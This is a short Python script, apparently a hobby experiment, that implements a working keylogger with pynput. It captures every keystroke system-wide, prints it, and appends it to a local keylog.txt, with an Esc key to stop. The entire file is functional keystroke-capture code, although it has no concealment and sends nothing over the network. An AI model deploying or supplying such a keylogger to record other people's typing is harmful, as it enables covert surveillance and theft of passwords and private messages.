########################################################################
#                                                                      #
#                    Super Awesome Project                             #
#              Keylogging experiment with Files                        #
#                                                                      #
########################################################################

import logging #for logging to a file
from pynput.keyboard import Key, Listener # for keylogs
import os

########################################################################
#                                                                      #
#                      Keylogging function                             #
#                                                                      #
########################################################################

# storing keys in file
count = 0
keys = []

# Function for when key is pressed
def on_press(key):
    global keys, count
    # storing keys and increasing count in file
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    # if count >= 1, call write_file to save keys into a file
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []    

# Function to write the keys list into a file
def write_file(keys):
    with open("keylog.txt", "a") as f:
        for key in keys:
            clean_key = str(key).replace("'","")

            # write deletion note into file or delete directly
            if (clean_key.find("backspace") > 0):
                f.write("[del_prev] ")
                
                # uncomment below code to use direct deletion of keys in file
                # however this is prone to potential deletion of all data in file if 
                # backspace is held

                # delete_last_char_file()
            
            # if space key is pressed and the last line in file is not a newline enter new line
            elif (clean_key.find("space") > 0) and not is_last_new_line_file():
                f.write('\n')
            
            # write keys into file
            elif clean_key.find("Key") == -1:
                f.write(clean_key)
            prev_key = clean_key

# checks if the last line in the file is a new line
def is_last_new_line_file():
    with open('keylog.txt', 'r') as f:
        last_line = f.readlines()[-1]
        if last_line == '\n':
            return True
        return False

# delets last char in file if backspace is pressed.
# def delete_last_char_file():
#     with open('keylog.txt', 'rb+') as f:
#         f.seek(-1, os.SEEK_END)
#         f.truncate()

# Failsafe to break keylogger file - currently set at esc key
def on_release(key):
    if key == Key.esc:
        return False

########################################################################
#                                                                      #
#                            With Listener                             #
#                                                                      #
########################################################################
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
